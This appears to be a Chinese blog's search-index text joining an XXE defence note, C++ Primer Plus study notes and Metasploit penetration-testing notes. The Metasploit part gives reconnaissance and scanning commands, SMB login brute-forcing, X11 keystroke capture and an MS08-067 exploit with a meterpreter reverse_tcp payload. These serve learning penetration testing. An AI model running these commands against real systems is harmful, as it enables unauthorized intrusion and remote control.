可以知道该 81 端口是 closed 的，而 80 端口是open的 防御禁用外部实体PHP： 1Copylibxml_disable_entity_loader(true); JAVA: 12CopyDocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false); Python： 12Copyfrom lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False)) 过滤输入1234&lt;!DOCTYPE&lt;!ENTITYSYSTEMPUBLIC","link":"/2021/04/14/xxe/"},{"title":"cpp","text":"简单记录一下 《C++ Primer Plus》 第十二章 类和动态内存分配特殊成员函数C++ 编译器自动生成下面这些成员函数的定义（如果没有定义）： 默认构造函数 默认析构函数 复制构造函数 赋值运算符 地址运算符 移动构造函数（C++ 11） 移动赋值运算符（C++ 11） 默认构造函数指不接受参数的构造函数，有了默认构造函数后可以使用类似于初始化自动变量的方式来初始化一个对象 1Klunk lunk; 如果定义一个类时没有提供任何构造函数，编译器将提供以下默认构造函数 1Klunk::Klunk() {} 也可以显式定义默认构造函数，常用于设置成员变量 1234Klunk::Klunk(){ klunk_ct = 0;} 在所有参数都有默认值的情况下，带有参数的构造函数也是默认构造函数 1234Klunk(int n=0){ klunk_ct = n;} 但只能有一个默认构造函数。 复制构造函数复制构造函数用于将一个对象复制到新创建的对象中（通常是初始化过程，包括按值传递参数），而不是常规的赋值过程。 类的复制构造函数原型通常如下 1Class_name(const Class_name &amp;); 新建一个对象并将其初始化为同类现有对象时，复制构造函数将被调用，假设 motto 是一个 StringBad 对象，以下声明将调用复制构造函数 123456StringBad ditto(motto);// 以下两种声明可能调用复制构造函数直接创建 metto 和 also，也可能使用复制构造函数生成临时对象后将内容赋值给 metto 和 alsoStringBad metoo = motto;StringBad also = StringBad(motto);// 以下声明会使用复制构造函数初始化匿名对象，并将指针赋值给 pStringBadStringbad * pStringBad = new StingBad(motto); 每当程序生成了对象副本，编译器都将使用复制构造函数。当函数按值传递对象或者返回对象时都将使用复制构造函数。 生成临时对象时也将使用复制构造函数。 默认的复制构造函数逐个复制非静态成员，复制的是成员的值（浅复制）。以下两种方式等效 12345StringBad sailor = sports;// 等效于StringBad sailor;sailor.str = sports.str;sailor.len = sports.len; 解决方案为定义一个显式的复制构造函数 123456789StringBad::StringBad(const StringBad &amp; st){ num_strings++; len = st.len; str = new char[len+1]; std::strcpy(str, st.str); cout &lt;&lt; num_strings &lt;&lt; &quot;: \\&quot;&quot; &lt;&lt; str &lt;&lt; &quot;\\&quot; object created\\n&quot;;} 赋值运算符将已有的对象赋值给另一个对象时将使用重载的赋值运算符。 类似于复制构造函数，赋值运算符的隐式实现也对成员进行逐个复制（浅复制）。 提供赋值运算符进行深度复制的定义时，实现与复制构造函数类似。但有一些不同： 由于目标对象可能引用了之前分配的数据，函数应使用 delete[] 释放这些数据 函数应当避免赋值给自身，否则释放内存时可能删除对象的内存 函数返回一个指向调用对象的引用 12345678910StringBad &amp; StringBad::operator=(const StringBad &amp; st){ if (this == &amp; st) return *this; delete [] str; len = st.len; str = new char [len+1]; std::strcpy(str, st.str); return *this;} 其中 delete []是由于稍后将把一个新的字符串地址赋给 str，如果不释放，则这个字符串将一直保留在内存中。 子类赋值运算符中需要调用父类的赋值运算符时 1baseDMA::operator=(hs); 定位 new 运算符对于使用定位 new 运算符分配的内存空间，应以与创建时相反的顺序显式调用析构函数来释放空间，而不是使用 delete。 初始化列表仅可以在构造函数中使用初始化列表 1234TTP:TTP (const string&amp; fn, const string&amp; ln) : firstname(fn), lastname(ln){} 第十三章 类继承构造函数子类的构造函数应总是使用初始化列表显式调用合适的父类构造函数，否则将调用默认构造函数 1234567891011// 声明class RP : public TTP{ int rate;}// 实现RP::RP(int r, const string&amp; fn, const string&amp; ln) : TPP(fn, ln){ rate = r;} 指针指向父类的指针可以用于指向子类，但只能使用父类的数据成员和公有方法。 虚方法virtual 有一个含义为 实际上的，事实上的，理解起来更容易。 被声明为 virtual 的方法在通过指针或引用调用时，将根据指针指向的对象的实际类型（而不是指针的类型，因为子类对象可以使用指向父类对象的指针）调用相应的方法。 virtual 关键字只用于类声明的方法原型中，不用在定义中。 虚析构函数如果子类的析构函数中包含了某些操作，那么父类应显式声明一个虚的析构函数。否则当使用父类指针的子类对象销毁时将只调用父类的析构函数。 用作基类的函数应总是声明一个虚析构函数。 重新定义方法如果在子类中重新定义了父类的方法，但与父类的特征标不通，子类的方法将覆盖父类的方法，而不是重载。 经验法则： 如果重新定义继承的方法，应确保与原来的原型完全想通。例外：如果返回基类的指针或引用，则可以修改为派生类的指针或引用 如果基类的有重载的方法需要重写，则在派生类中应重新定义所有的重载版本 纯虚函数类似于接口，声明一个类方法时可以在声明后加 =0 使其成为纯虚方法，有纯虚方法的类不能实例化，基类中不必提供纯虚方法的定义，而子类必须覆盖纯虚方法。 第十四章 代码重用包含一个类中可以包含另一个类 1234class Studnet{ std::string name;} 构造函数定义 1Studnet(const char* str): name(str) {} 多数情况下应使用包含，除非需要使用私有继承的特性如使用 protected 成员或者需要重写虚方法。 模板类 valarray声明 1valarray&lt;type&gt; classname; 初始化 12345double gpa[3] = {3.1, 3.5, 3.8};valarray&lt;int&gt; v1; // emptyvalarray&lt;int&gt; v2(6); // 6 elementsvalarray&lt;int&gt; v3(10,8); // 8 elements, each set to 10valarray&lt;double&gt; v4(gpa,4); // 4 elements, initialized with array 私有继承基类的公有成员将成为派生类的私有成员，基类的接口在培盛磊中可用 123class Student :private std::string{} 构造函数定义 1Student(const char* str) :std::string(str){} 由于是继承，所以使用类名调用基类的构造函数。 使用类名和作用域解析符调用基类的方法，使用强制类型转换将子类转换为基类来访问基类对象本身 123456789101112double Student::Average() const{ if (ArrayDb::size() &gt; 0) return ArrayDb::sum; else return 0;}const string&amp; Student::Name() const{ return (const string&amp;) *this;} 保护继承基类的公有成员和保护成员都成为派生类的保护成员，继承层次较多时依然可用 多重继承必须使用访问控制符修饰每一个基类，否则默认为 private。 不使用虚基类的 MI 不会引入新的语法规则。 虚基类假设 Singer 和 Waiter 继承自 Worker，SingingWaiter 继承自 Singer 和 Waiter 使用虚基类使 SingingWaiter 只包含一个 Worker（通常将包含两个，分别来自 Singer 和 Waiter） 123class Singer : virtual public Worker {...};class Waiter : public virtual Worker {...};class SingingWaiter : public Singer, public Waiter {...}; 此时 SingingWaiter 只包含 Worker 对象的一个副本，本质上时 Singer 和 Waiter 共享一个 Waiter 对象 构造函数如果 Worker 是虚基类，则在以下 MI 构造函数中 12SingingWaiter(const Worker&amp; wk, int p = 0, int v = Singer::other): Waiter(wk,p), Singer(wk,v) {} 初始化了 panache 和 voice，但不会将 wk 的信息传递给子对象 Waiter 和 Singer（否则会由于使用两个 Worker 的构造函数导致冲突）。但创建派生类对象前必须调用基类构造函数，因此会使用 Worker 的默认构造函数。 如果不希望使用默认构造函数创建虚基类对象，则需要显式调用所需的构造函数 12SingingWaiter(const Worker&amp; wk, int p =0, int v = Singer::other): Worker(wk), Waiter(wk,p), Singer(wk,v) {} 只能对虚基类这样做 成员方法应在 SingingWaiter 中重写的 Show方法指定使用 Singer 或是 Waiter 的版本 1234void SingingWaiter::Show(){ Singer::Show();} 类模板使用模板定义替换类声明，使用模板成员函数替换类成员函数，模板类也以template &lt;typename Type&gt;开头，Type 为泛型名，常用 Type 和 T，模板被调用时，Type 将被具体类型取代。 模板的具体实现和声明应放置在同一文件中。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061// stack.h#ifndef STACKTP_H_#define STACKTP_H_template &lt;class Type&gt;class Stack{private: enum {MAX = 10}; // constant specific to class Type items[MAX]; // holds stack items int top; // index for top stack itempublic: Stack(); bool isempty(); bool isfull(); bool push(const Type &amp; item); // add item to stack bool pop(Type &amp; item); // pop top into item};template &lt;class Type&gt;Stack&lt;Type&gt;::Stack(){ top = 0;}template &lt;class Type&gt;bool Stack&lt;Type&gt;::isempty(){ return top == 0;}template &lt;class Type&gt;bool Stack&lt;Type&gt;::isfull(){ return top == MAX;}template &lt;class Type&gt;bool Stack&lt;Type&gt;::push(const Type &amp; item){ if (top &lt; MAX) { items[top++] = item; return true; } else return false;}template &lt;class Type&gt;bool Stack&lt;Type&gt;::pop(Type &amp; item){ if (top &gt; 0) { item = items[--top]; return true; } else return false; }#endif 使用时用具体类型替代泛型名进行实例化 12Stack&lt;int&gt; is;Stack&lt;string&gt; ss; 必须显式提供所需类型（不同于函数模板）。 与函数模板类似，有隐式实例化，显式实例化，和显式具体化，统称为具体化（specialization） 友元使用友元函数时，应使用具体化的对象，声明中 12345template &lt;typename T&gt;class HasFriend{ friend void report(HasFriend&lt;T&gt; &amp;);} 而且由于 report 不是成员函数，所以必须为其提供定义显式具体化 12void report(HasFriend&lt;short&gt; &amp;) {...};void report(HasFriend&lt;int&gt; &amp;) {...}; 另一种解决方案时使友元函数本身成为模板 首先在类定义前面声明每个模板函数 12template &lt;typename T&gt; void counts();template &lt;typename T&gt; void report(T &amp;); 然后在函数中再次将模板声明为友元 1234567template &lt;typename T&gt;class HasFriend{ friend void counts&lt;T&gt;(); friend void report&lt;&gt; (HasFriend&lt;T&gt; &amp;)； // or report&lt;HasFriend&lt;T&gt;&gt; (HasFriend&lt;T&gt; &amp;)；} 最后要为友元提供模板定义 模板别名可以使用 typedef 为模板具体化指定别名 12typedef std::array&lt;double, 12&gt; arrd;typedef std::array&lt;int, 12&gt; arri; 也可以使用模板提供一系列别名 1234template&lt;typename T&gt; using arrtype = std::array&lt;T,12&gt;;arraytype&lt;int&gt; days; // std::array&lt;int,12&gt; using = 语法用于非模板时等价于 typedef 12typedef const char *pc1;using pc2 = const char*; 第十五章 友元、异常和其他友元类被声明为友元的类可以访问 private 和 protected 成员 123456class Tv{public: friend class Remote;...} 可以只将另外一个类的某个成员函数作为友元，此时需要重排声明顺序 1234567class Tv; class Remote {...};class Tv; { friend void Remote::set_chan();};// 函数定义 也可以使两个类是彼此的友元 123456789class Tv{friend class Remote;}class Remote{friend class Tv;}// 函数定义 嵌套类可以在类中定义类 123456class Queue{ class Node { }} 可以在嵌套类中使用模板 异常cstdlib 中包含 abort 函数，它向 stderr 中发送消息，然后终止程序。 也可以使用返回值指出出现了错误。 也可以使用 try catch 123456789101112int a = 3;int b = 0;try{ if ( b==0 ) throw &quot;Divided by 0&quot;; a /= b;}catch ( const char* s ){ cout &lt;&lt; s;} 通常将对象用作异常类型，可以获得更多信息 123456789101112131415161718class err{private: double v1, v2;public: err(double a, double b) :v1(a), v2(b) {} void msg() { cout &lt;&lt; &quot;v1: &quot; &lt;&lt; v1; }}...try{... throw err(a,b)}catch (err&amp; e){ e.msg();} try catch 中将总会为异常创建一个拷贝，即使声明了引用。此时声明引用的意义在于基类的引用可以用于子类。 exception 类C++ 中提供了异常类的基类 exception类，在 exception 头文件中，它有 what 虚方法，返回一个字符串。 头文件 stdexcept 定义了 logic_error 和 runtime_error 等异常类，它们都是 exception 的公有派生。构造函数接受一个 string 对象为参数，为 what 方法提供数据。两个类都有一些派生类 12345678910// logic_error 系列domain_errorinvalid_argumentlength_errorout_of_bouonds// runtime_error 系列range_erroroverflow_errorunderflow_error 新标准中，当 new 无法分配请求的内存时会引发 bad_alloc 异常，它时 exception 的公有派生。以前则是返回空指针。新标准中也提供了失败时返回空指针的 new 1int * pi = new (std::nothrow) int; 异常处理失败throw 一个异常后，如果在带有异常规范的函数中引发，则必须与异常规范列表中的某种一场匹配，否则称为意外异常，导致程序异常终止。如果异常不是在函数中引发的（或函数没有异常规范），则必须 catch ，否则称为未捕获的异常，默认情况下导致程序异常终止，但可以修改默认行为。 RTTI运行阶段类型识别（Runtime Type Identification），只适用于包含虚函数的类层次结构，因为只有这种结构才应该将派生对象的地址赋给基类指针 C++ 有3个支持 RTTI 的元素： 如果可能的话，dynamic_cast运算符将使用一个指向基类的指针来生成一个指向派生类的指针，否则返回0（空指针） typeid 运算符返回一个指出对象类型的值 type_info结构存储了有关特定类型的信息 类型转换运算符新增4个类型转换运算符，规范转换过程 1234dynamic_castconst_caststatic_castreinterpret_cast 第十六章 string 类和标准模板库string 类string 类在头文件 string 中，实际上是模板具体化basic_string&lt;char&gt;的一个 typedef，同时省略了有关内存管理的参数。 构造函数size_type是一个依赖于实现的整型，npos为字符串的最大长度，通常为unsigned int的最大值，NBTS（null-terminated string）表示 C字符串。 1234567891011121314151617181920212223242526string(const char* s); string(size_type n, char c);// 创建包含 n 个元素的 string 对象，每个元素都初始化为 cstring(const string&amp; str);// 复制构造函数string()// 长度为0，默认构造函数string(const char* s, size_type n)// 初始化为 s 指向的 NBTS 的前 n 个字符，即使超过了 /0 template&lt;typename Iter&gt;string(Iter begin, Iter end);// 初始化为区间 [begin,end) 内的字符string(const string&amp; str, size_type pos = 0, size_type n = npos)// 初始化为对象 str 从 pos 开始的 n 个字符string(string &amp;&amp; str) noexcept// 移动构造函数，初始化为 string 对象 str，并可能修改 str（C++ 11）string(initialize_list&lt;char il)// 初始化为初始化列表 il 中的字符（C++ 11） 输入C字符串的输入 1234char info[100];cin &gt;&gt; info; // read a wordcin.getline(info,100); // read a line discard \\ncin.get(info, 100); // read a line ,leave \\n in queue string 对象的输入 123string stuff;cin &gt;&gt; stuff; // read a wordgetline(cin, stuff); // read a line, discard \\n getline 都有一个可选参数用于指定确定输入边界的字符 12cin.getline(info, 100, ':'); // discard :getline(cin, stuff, ':'); string 的 getline 函数读取字符存入 string 对象，直到三者之一发生： 到达文件尾，此时会设置输入流的 eofbit，fail 和 eof 函数都将返回 true 遇到分界字符（默认为换行），将从输入流中删除分界字符，但不存储它 读取的字符达到最大允许值，（string::npos 和可供分配的内存字节数中较小的一个），将设置 failbit，fail 方法返回 true 输入流对象有统计系统，遇到文件尾设置 eofbit，检测到输入错误设置 failbit，出现无法识别的故障设置 badbit，顺利时设置 goodbit。 string 的 operater&gt;&gt; 函数类似，但是遇到空白字符时将把该空白字符留在输入队列中。空白字符包括空格、换行和制表符，使用isspace()会返回 true。 方法string 对象重载了全部 6 个关系运算符，按 ascii 码排列。 可以使用 += 拼接字符串 size 和 length 成员函数返回字符串中的字符数。 find 方法可以寻找子字符串或字符，可以指定开始位置，也可以指定将参数的前 n 个字符作为待查找的子字符串。除此之外，还有 rfind，find_first_of，find_last_of，find_first_not_of，find_last_not_of 等方法。 c_str 方法返回一个指向 C 字符串的指针 字符串种类string 库实际上基于一个模板类 123template&lt;class charT, class traits = char_traits&lt;charT&gt;, class Allocator = allocator&lt;charT&gt; &gt;basic_string {...}; 模板 basic_string 有四个具体化，每个都有一个 typedef 名称 1234typedef basic_string&lt;char&gt; string;typedef basic_string&lt;wchar_t&gt; wstring;typedef basic_string&lt;char16_t&gt; u16string; // C++ 11typedef basic_string&lt;char32_t&gt; u32string; // C++ 11 智能指针模板类智能指针时行为类似于指针的类对象，但具有其他功能。对象过期时，对象的析构函数可以删除指向的内存。 有三个智能指针对象，auto_ptr（C++11 废弃），unique_ptr 和 shared_ptr（后面两个为C++11新增）。 使用 new 将返回的地址赋给这些对象，无需记住使用 delete 释放内存，智能指针过期时，将由析构函数自动释放内存。 智能指针不能用于非堆内存。 使用智能指针对象需要包含头文件 memory，在命名空间 std 中使用，然后使用通常的模板语法实例化所需类型的指针。 12345678910// 声明template&lt;class X&gt;class auto_ptr{public: explicit auto_ptr(X* p =0) throw();}// 使用，new double 是一个指针，是构造函数的参数auto_ptr&lt;double&gt; pd(new double); 在多次使用同一个指针初始化多个 auto_ptr 时，会对同一个内存块多次调用 delete 导致崩溃。 多个 unique_ptr 不能指向同一个内存块，否则会引发编译错误。 多个 shared_ptr 指向同一个内存块时，存在一个计数器，记录 shared_ptr 的数量，只有减到 0 时才会释放内存。 如果程序要使用多个指向同一个对象的指针应使用 shared_ptr，否则使用 unique_ptr。 标准模板库（STL）STL 提供了一组表示容器、迭代器、函数对象和算法的模板。STL 不是面向对象的编程，而是泛型编程（generic programming）。 STL 从广泛角度定义了一些非成员函数执行一些操作。 容器模板类 vector123#include vectorusing namespace std;vector&lt;int&gt; ratings 与 string 类相似，各种 STL 容器模板都提供一个可选的模板参数用来指定使用哪个分配器对象管理内存。 STL 的容器模板类都提供了一些基本方法，包括： size，返回容器中元素的数目 swap，交换两个容器的内容 begin，返回一个指向容器中第一个元素的迭代器 end，返回一个表示超过容器尾的迭代器 vector 还有一些只有部分容器才有的方法： push_back(element)，将元素添加到 vector 末尾 erase(begin, end)，接受两个迭代器参数，删除区间内的元素，包括 begin 但不包括 end insert(pos, begin, end)，接受三个迭代器参数，第一个指定新元素的插入位置，第二个和第三个定义插入的区间 还有一些 STL 函数，它们是非成员函数： for_each，接受三个参数，前两个是定义容器区间的迭代器，最后一个是指向函数的指针（或者说函数对象），for_each 函数将被指向的函数应用于区间中的每个元素 random_shuffle 函数接受两个指定区间的迭代器参数，并随机排列区间中的元素，此函数要求容器类允许随机访问 sort，有两个版本，第一个版本接受两个定义区间的迭代器参数，使用 operator&lt; 比较，用于用户定义的类型时必须提供 operator&lt; 定义。第二个版本接受第三个参数，是想要使用的函数指针（函数对象），这个函数需要返回能转化为 bool 的值，返回 false 代表顺序错误。同样要求容器允许随机访问 泛型编程迭代器迭代器使算法独立于使用的容器类型，具有以下特征 能够解除引用 能将一个迭代器赋值给另一个 迭代器之间能够比较 能使用迭代器遍历容器中的元素，通过为迭代器 p 定义 ++p 和 p++ 实现 有5种迭代器，分别是输入迭代器、输出迭代器、正向迭代器、双向迭代器和随机访问迭代器。算法原型指出了需要的迭代器 12345template&lt;class InputIterator, class T&gt;InputIterator find(InputIterator first, InputIterator last, constT&amp; value);template&lt;class RandomAccessIterator&gt;void sort(RandomAccessIterator first, RandomAccessIterator last); 算法会尽量使用低等级的迭代器。 输入迭代器“输入”是从程序的角度来说，即来自容器的信息被视为输入。因此，输入迭代器可被容器用来读取容器中的信息。 对输入迭代器解除引用使程序能够读取容器中的值，但不一定能够修改，所以需要输入迭代器的算法不会改变容器中的值。 输入迭代器必须能够访问容器中所有的值，通过支持 ++ 运算符（前缀和后缀格式）实现。 输入迭代器使单项迭代器，可以递增不能倒退。基于输入迭代器的算法应该是 single-pass 的，不依赖于前一次遍历时的迭代器值，也不依赖于本次遍历中前面的迭代器值。 输出迭代器与输入迭代器相反。 正向迭代器正向迭代器只能使用++运算符便利容器，但是它总是按相同顺序便利一系列值，迭代器递增后依然可以对前面的迭代器值解出引用并得到相同的值，因此可以用于 多次通行算法。 即可以只读，也可以读写。 双向迭代器相比于正向迭代器，同时支持 – 运算符。 随机访问迭代器有些算法要求能够直接跳到容器中的任何一个元素（随机访问），除了双向迭代器的特性意外，同时需要支持随机访问。 在容器区间内，需要支持一系列运算，包括：+（迭代器和数字相加，顺序不限），-（迭代器减数字），+=，-=，[]，&lt;，&gt;，&gt;=，&lt;=。 概念改进和模型——无需关联容器函数对象——其他库第十七章 输入、输出和文件输入与输出流和缓冲区和 iostream 文件C++ 程序把输入和输出看作字节流。输入时，程序从输入流中抽取字节；输出时，程序将字节插入到输出流中。 iostream 文件包含了一些类： streambuf 类为缓冲区提供了内存，并提供了用于填充缓冲区、访问缓冲区内容、刷新缓冲区和管理缓冲区内存的类方法 ios_base 表示流的一般特征，如是否可读取，时二进制还是文本流等 ios 类基于 ios_base ，其中包含了一个指向 streambuf 对象的指针成员 ostream 和 istream 是从 ios 类派生而来的，分别提供了输出和输入方法 iostream 类是基于 istream 和 ostream 类的，继承了输入和输出方法。 在程序中包含 iostream 文件将自动创建8个流对象：cin，wcin，cout，wcout，cerr，wcerr，clog，wclog。流对象存储了有关输出的数据成员，如显式数据时使用的字符宽度，小数位数，显示整数时采用的技术方法及 streambuf 对象的地址。 重定向对标准输出的重定向不影响 cerr 和 clog 使用 cout 输出使用 ostream 对象和 &lt;&lt; 运算符输出，&lt;&lt;运算符应返回 ostream &amp;来连续输出 ostream 类还提供了 put（显示字符）和 write（显示字符串）方法 刷新输出缓冲区使用 cout 将字节发送到标准输出时，字节被存储在缓冲区中。缓冲区被填满时，程序将刷新缓冲区，把内容发送出去，并清空缓冲区。输出到屏幕时，多数实现会在输入发生时刷新缓冲区，也可以使用控制符刷新缓冲区 12cout &lt;&lt; 'a' &lt;&lt; flush;cout &lt;&lt; 'b' &lt;&lt; endl; 也可以使用函数刷新 1flush(cout) 用 cout 进行格式化ostream 插入运算将值转换为文本格式。 ios_base 类存储了描述格式状态的信息，通过使用 ios_base 的成员函数，可以控制字段宽度和小数位数。 使用用 cin 输入文件输入和输出内核格式化","link":"/2021/01/18/cpp/"},{"title":"Metasploit 笔记","text":"基本操作 metasploit 渗透测试指南 小笔记 情报搜集被动信息搜集whois 查询whois 可以查找域名服务器，如果Name Server不属于要测试的站点，则不应该将其作为攻击目标。 1whois testfire.net 也可以查询IP地址 1whois 65.61.137.117 如果NetType并不在域名内，可能网站是由提供托管服务的第三方运营的。 NetcraftNetcraft，可以查出服务器的IP地址，例如testfire.net的IP地址是65.61.137.117。 nslookup123nslookupset type=mxtestfire.net 查到 mail addr 不属于 testfire.net，也不在攻击范围内。 Google Hacking可以通过搜索关键词 site，将搜索目标限定在网站域名下。搜索site:testfire.net，可以发现有 www demo altoro 三个子域名，而且除了80端口，8080端口也提供web服务。demo.testfire.net域名下存在两个目录遍历的不安全配置缺陷，导致RTF文档敏感文件泄露和ASP源码泄露。在8080端口提供基于 Swagger的AltoroJ API 接口和使用手册。 还可以搜索一些与渗透攻击目标相关的搜索词，比如site:testfire.net admin，可以发现管理员后台登录界面。使用site:testfire.net login可以发现login界面泄露的ASP源码。可以想到这里存在本地文件包含和SQL注入。 主动信息搜集使用Nmap进行扫描推荐选项 -sS执行一次隐秘的TCP扫描，-Pn不要使用ping命令预先判断主机是否存活，默认所有主机都是存活的，适用于Internet上的渗透测试环境，因为大多数网络不允许ICMP协议通过。 可以加入 -A选项尝试获得深入的服务枚举和旗标获取。 使用数据库渗透比较复杂时可以使用数据库。默认使用 postgresql，用db_status可以确认数据库连接情况。 将nmap输出导入 metasploit123456nmap -Pn -sS -A -oX Subnet1.xml 192.168.1.0/24# 扫描网络，将结果保存在 Subnet1.xml 中db_import Subnet1.xml# 将其中的内容导入数据库hosts -c address# 核实结果，显示数据库中所有已保存的主机信息 TCP空闲扫描这种扫描可以冒充网络上另一台主机的IP地址，对目标进行更隐秘的扫描。首先需要定位一台使用递增IP帧标识机制的空闲主机。它的IP帧标识是可以预测的，能够计算出下一个IP帧标识。当我们冒充这台主机的IP地址对目标主机的某个端口进行探测后，如果该空闲主机实际的IP帧标识与预测不同，意味着那个端口可能是开放的。 可以使用scanner/ip/ipidseq模块寻找符合要求的空闲主机。 12use auxiliary/scanner/ip/ipidseqshow options 显示了执行扫描所需的参数，RHOST参数可以使用IP地址段，如192.168.1.100-192.168.1.200，或者 CIDR 无类型域间选路 地址块，如192.168.1.0/24，使用都好的多个CIDR地址块以及每行包含一个IP地址的IP列表文本文件，如file:/tmp/hostlist.txt。THREADS参数设定扫描的线程数，默认为1。Windows中不要超过16，类UNIX系统不要超过128。 执行扫描： 123set RHOSTS 192.168.1.0/24set THREADS 50run 在扫描结果中可以发现可用于扫描的主机，例如192.168.1.131，可以使用 nmap 的-sI选项指定这台主机作为空闲主机对目标进行扫描。 1nmap -Pn -sI 192.168.1.131 192.168.1.201 这种方法不用自身IP想目标主机发送信息。 在msf终端运行nmapmsfconsole 中连接数据库后，可以使用 db_nmap命令，把nmap结果存储在数据库中。 1db_nmap -sS -A 192.168.1.201 可以执行services 命令查看数据库中关于系统上运行服务的扫描结果： 1services -u 使用 metasploit 进行端口扫描除了第三方扫描器，辅助模块中也包含了内建的端口扫描器，有时这些扫描器更具有优势。例如贡献了一台位于防火墙之后使用NAT的主机，这台主机使用无法从Internet直接连接的私有IP，如果希望使用 metasploit 对NAT后的主机进行攻击，可以使用已攻陷的主机作为跳板，将流量传送到内部的主机。 查看提供的扫描工具，本例中使用 SYN 端口扫描器： 12345search portscanuse auxiliary/scanner/portscan/synset RHOSTS 192.168.1.201set THREADS 50run 针对性扫描举例来说，在目标网络中快速扫描存在 MS08-067 漏洞的主机很常见，因为这是一个普遍存在的安全漏洞，并且能轻松获得 SYSTEM 权限。 服务器消息块协议扫描可以利用smb_version模块遍历一个网络，并获取Windows版本号。 1234use auxiliary/scanner/smb/smb_versionshow optionsset RHOSTS 192.168.1.201run 稍后可以使用 hosts 查看保存的结果。 搜寻配置不当的 Microsoft SQL ServerMS SQL 默认监听TCP 1433 端口，如果使用了随机的TCP端口，可以对UDP 1434 进行查询来获得这个随机的端口号。Metasploit 中有 mssql_ping模块实现。 12345use auxiliary/scanner/mssql/mssql_pingshow optionsset RHOSTS 192.168.1.0/24set THREADS 255run SSH 服务器扫描ssh_version可以识别SSH版本。 1234use auxiliary/scanner/ssh/ssh_versionset RHOSTS 192.168.67.0/24set THREADS 50run FTP 扫描1234use auxiliary/scanner/ftp/ftp_versionset RHOSTS 192.168.67.0/24set THREADS 255run 检查是否允许匿名登录，以及匿名用户的权限 1234use auxiliary/scanner/ftp/anonymousset RHOSTS 192.168.67.0/24set THREADS 50run 简单网管协议扫描SNMP 常用于网络设备，提供系统信息。模块scanner/snmp/snmp_enum，如果能够获取制度或者读写的团体字符串，将发挥重要作用，提供许多重要信息。短体字符串基本等同于查询设备信息或者写入设备配置参数所需的口令。得到团体字符串后，利用scanner/snmp/snmp_login模块可以尝试对一个IP或者一段IP使用字典破解团体字符串。 1234use auxiliary/scanner/snmp/snmp_loginset RHOSTS 192.168.1.0/24set THREADS 50run 编写自己的扫描器 漏洞扫描使用漏洞扫描器通常会在网络上产生大量流量，如果渗透测试工作不需要隐秘进行，使用漏洞扫描器非常方便。 基本的漏洞扫描使用 netcat 获取目标的旗标。一旦连接到一个服务端口或向他们发送特定指令时，就可以获得旗标，例如Web服务器。 12nc 192.168.67.140GET HTTP/1.1 会回复一个 400 错误，并说明服务器是 IIS 5.1，可以据此查找已知漏洞。 漏洞扫描器有时存在误报和漏报，常用的漏洞扫描器包括 Nexpose, Nessus 和一些专项扫描器。 使用 Nexpose 进行扫描扫描的目标是一个默认安装的 Windows XP SP2 主机，首先进行一次公开的白盒扫描，然后将结果导入 Metasploit。同时也可以在 MSF终端 调用Nexpose。 配置启动服务后，访问https://localhost:3780，接受Nexpose签发的服务器整数，用安装时设定的用户名和密码登录，并完成激活。 标签页： 资产（Assets）显示已经扫描过的计算机和设备 报告（Report）列出扫描后生成的报告 漏洞（Vulnerabilities）对在网络上发现的漏洞进行详细描述 管理（Administration）可以对系统配置进行修改 有创建站点向导、手动扫描向导、生成报告向导可以使用。 将扫描报告导入 Metasploit完成了一次完整的漏洞扫描后，在 msfconsole 中使用 db_nonect 创建一个新数据库，使用db_import将Nexpose的 XML 格式扫描报告文件导入数据库。Metasploit会识别出文件是由 Nexpose 生成的，并将扫描结果导入。随后使用db_hosts查看导入是否成功。 123db_connect postgres:toor@127.0.0.1/msf3db_import /tmp/host_195.xmldb_hosts -c address,svcs,vulns 如果想显示导入漏洞的详情可以使用db_vulns。 在 MSF 控制台中运行 NexposeMetasploit 中包含 Nexpose 插件，可以在MSF终端中完成漏洞扫描。扫描之前需要使用db_connect创建新的数据库。 12db_connect posttgres:toor@127.0.0.1/msf3load nexpose 使用help可以获得此插件的命令。第一次扫描之前需要连接到所安装的 Nexpose 实例，输入nexpose_connect -h可以显示连接参数，在这里需要提供连接 Nexpose 需要的用户名、密码和IP地址，在最后加上 ok 参数表示接受SSL证书警告。 123nexpose_connect -hnexpose_connect username:password@127.0.0.1 oknexpose_scan 192.168.67.140 扫描结束后，结果保存在了数据库中。 12db_hosts -c addressdb_vulns 使用 Nessus 进行扫描专用漏洞扫描器验证SMB登录这种扫描会留下大量记录 1234567use auxiliary/scanner/smb/smb_loginshow optionsset RHOSTS 192.168.67.140set SMBUser administratorset SMBPass 123456set VERBOSE falserun 扫描开放的VNC空口令新版本的VNC不允许空口令 1234use auxiliary/scanner/vnc/vnc_none_authshow optionsset RHOSTS 192.168.67.140run 扫描开放的X11服务器12345use auxiliary/scanner/x11/open_x11show optionsset RHOSTS 192.168.67.140set THREADS 50run 如果发现了漏洞，可以利用xspy记录键盘输入。 12cd /pentest/sniffers/xspy/./xspy -display 192.168.67.140 -delay 100 渗透攻击之旅渗透攻击基础12345678910show exploits # 显示所有可用的攻击模块show auxiliary # 显示所有辅助模块和他们的用途show options # 选择模块后，列出所需的参数back # 回到上一个状态search &lt;module&gt; # 查找特定的模块/漏洞use &lt;module&gt; # 加载模块，此时命令提示符会变化show payloads # 查看可用payloadset payload &lt;payload&gt; # 选择payloadshow targets # 列出受影响的系统info # 提供正在使用的模块的详细信息 模块中的参数只有两个状态，set 和 unset。有些参数是必填的（required），必须手工设置并且处于启用状态。使用 set 命令可以对某个参数进行设置并启用，unset 可以禁用相关参数。 1234set RHOST 192.168.67.140set TARGET 4show optionsunset RHOST setg 和 unsetg 是上面两个的全局版本，有些参数不会经常改变，比如 LHOST 可以通过setg 设置。 save 命令可以把使用 setg 设置的全局参数保存下来，下次启动 msfconsole 时可以继续使用。在任何时候都可以使用 save 保存当前状态。 攻击 Windows靶机：Windows XP SP2 和 Ubuntu 9.04，Windows 配置了 IIS 和 SQL Server。 利用 MS08-067 漏洞 使用 nmap 扫描脚本，扫描Windows 1nmap -sT -A --script=smb-vuln-ms08-067 -P0 192.168.67.140 -sT隐秘的tcp连接扫描，-A高级系统探测功能，扫描结果显示MS08-067: VULNERABLE。 MS08-067 漏洞高度依赖于系统版本，所以我们手动指定目标版本，保证能触发正确的一处代码。 12345678910search ms08_067_netapiuse exploit/windows/smb/ms08_067_netapiset PAYLOAD windows/meterpreter/reverse_tcpshow targetsset TARGET 4set RHOST 192.168.67.140set LHOST 192.168.67.136set LPORT 8080show optionsexploit 先查找 MS08-067 